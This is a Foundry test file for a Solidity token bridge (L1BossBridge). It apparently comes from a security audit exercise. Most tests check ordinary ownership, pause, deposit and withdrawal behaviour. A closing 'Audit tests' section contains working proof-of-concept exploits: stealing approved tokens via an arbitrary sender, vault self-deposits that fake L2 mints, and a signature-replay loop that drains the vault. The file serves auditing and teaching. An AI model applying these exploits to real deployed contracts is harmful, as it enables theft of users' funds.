// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract L1BossBridgeTest is Test {
    event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");
    // Accounts in foundry come with operator.key and operator.addr

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    function testDeployerOwnsBridge() public {
        address owner = tokenBridge.owner();
        assertEq(owner, deployer);
    }

    function testBridgeOwnsVault() public {
        address owner = vault.owner();
        assertEq(owner, address(tokenBridge));
    }

    function testTokenIsSetInBridgeAndVault() public {
        assertEq(address(tokenBridge.token()), address(token));
        assertEq(address(vault.token()), address(token));
    }

    function testVaultInfiniteAllowanceToBridge() public {
        assertEq(token.allowance(address(vault), address(tokenBridge)), type(uint256).max);
    }

    function testOnlyOwnerCanPauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());
    }

    function testNonOwnerCannotPauseBridge() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.pause();
    }

    function testOwnerCanUnpauseBridge() public {
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        tokenBridge.unpause();
        assertFalse(tokenBridge.paused());
        vm.stopPrank();
    }

    function testNonOwnerCannotUnpauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.unpause();
    }

    function testInitialSignerWasRegistered() public {
        assertTrue(tokenBridge.signers(operator.addr));
    }

    function testNonOwnerCannotAddSigner() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.setSigner(operator.addr, true);
    }

    function testUserCannotDepositWhenBridgePaused() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();

        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanDepositTokens() public {
        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, userInL2, amount);
        tokenBridge.depositTokensToL2(user, userInL2, amount);

        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amount);
        vm.stopPrank();
    }

    function testUserCannotDepositBeyondLimit() public {
        vm.startPrank(user);
        uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
        deal(address(token), user, amount);
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanWithdrawTokensWithOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }

    function testUserCannotWithdrawTokensWithUnknownOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), makeAccount("unknownOperator").key);

        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWithInvalidSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;

        vm.expectRevert(ECDSA.ECDSAInvalidSignature.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWhenBridgePaused() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

    /**
     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
     * request from an account that never originated a transaction containing a successful deposit.
     */
    function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }


    /*//////////////////////////////////////////////////////////////
                           Audit tests
    //////////////////////////////////////////////////////////////*/

    function testCanStealApprovedTokensFromOtherUsers() public {
        vm.prank(user); // Alice approving the bridge to spend her tokens
        token.approve(address(tokenBridge), type(uint256).max);

        // Bob stealing money by depositing Alice's balance into L1 vault and receiving the funds on Bob's L2 address
        uint256 depositAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, depositAmount);
        // Bob steals Alice's tokens - funds are sent to Bob on the L2
        tokenBridge.depositTokensToL2(user, attacker, depositAmount);

        assertEq(token.balanceOf(user), 0); 
        assertEq(token.balanceOf(address(vault)), depositAmount);
        vm.stopPrank();
    }

    // test if we can infinitely transfer funds from the vault to the vault emiting events allowing us to infinitely mint tokens on the L2
    function testCanTransferFromVaultToVault() public {
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance); // put tokens in the vault

        // Can trigger the deposit event when we self transfer events from vault to vault
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 

    }

    // test if an attacker can re-use the v, r, s signature
    // To avoid replay attacks, use a nonce/deadline or some type of one-time use check in the signature so they can only be used once
    function testSignatureReplay() public {
        // assume the attacker and vault already holds some tokens
        uint256 vaultInitialBalance = 1000e18;
        deal(address(token), address(vault), vaultInitialBalance);

        uint256 attackerInitialBalance = 100e18;
        address attacker = makeAddr("attacker");
        deal(address(token), address(attacker), attackerInitialBalance);

        // An attacker deposits tokens to L2
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);

        // attacker deposits tokens to L2
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
        
        // on the L2, we called the withdrawTokensToL1 function

        // The signer/operator is going to sign the withdrawal on L2
        // This is the message:
        bytes memory message = abi.encode(
            address(token), 
            0, 
            abi.encodeCall(
                IERC20.transferFrom, 
                (address(vault), attacker, attackerInitialBalance)
            )
        );
        // This is the message, signed with the operator's keys and returning the v, r, s components of the signed message
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            operator.key, //operator private key
            MessageHashUtils.toEthSignedMessageHash( // message formated to EIP-191
                keccak256(message)
            )
        );

        // Because the operators signed the message once, we can replay that message until the vault is empty
        while(token.balanceOf(address(vault)) > 0) {
            // The attacker can replay the signature and withdraw the tokens from the vault
            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
        }

        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);

    }

}
